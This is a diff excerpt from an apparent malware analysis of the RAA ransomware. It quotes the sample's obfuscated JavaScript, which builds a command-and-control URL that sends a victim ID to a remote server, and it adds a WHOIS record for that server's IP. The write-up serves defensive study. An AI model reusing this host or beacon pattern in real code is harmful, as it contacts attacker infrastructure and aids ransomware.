@@ -324,7 +324,44 @@ Last part of the function checks if there are currently running **wscript.exe** 
 
 Last part of the code contains two functions, **HxBG()** and **izzU()**
 
-First, let's take a look at **izzU()** (doDirtyJob())
+First, let's take a look at **izzU()**. First thing is to initialize **KrvABjTTXNS** array with values get from remote server. Function **get_HZtSmFNRdJM()**, which is responsible for this part, contains hardcoded url, with **id** argument passed via GET:
+
+```javascript
+var VuSD = cVjZujcP + " - RAA";
+var MOSKn = [];
+MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
+```
+
+Server IP address (188.40.248.65) is a part of a network located in Germany (?), registered by 
+```
+
+% Abuse contact for '188.40.248.64 - 188.40.248.95' is 'abuse@hetzner.de'
+
+inetnum:        188.40.248.64 - 188.40.248.95
+netname:        HOS-131355
+descr:          HOS-131355
+country:        DE
+admin-c:        STPS1-RIPE
+tech-c:         STPS1-RIPE
+status:         ASSIGNED PA
+mnt-by:         HOS-GUN
+created:        2015-07-21T01:16:26Z
+last-modified:  2015-07-21T01:16:26Z
+source:         RIPE # Filtered
+
+person:         SC THC Projects SRL
+address:        str complexului 3
+address:        207206 Carcea
+address:        ROMANIA
+phone:          +40743216666
+nic-hdl:        STPS1-RIPE
+remarks:        For abuse contact abuse@thcservers.com or visit https://www.thcservers.com
+abuse-mailbox:  abuse@thcservers.com
+mnt-by:         HOS-GUN
+created:        2014-11-30T13:42:54Z
+last-modified:  2014-11-30T13:42:54Z
+source:         RIPE # Filtered
+```
 
 ```javascript
 
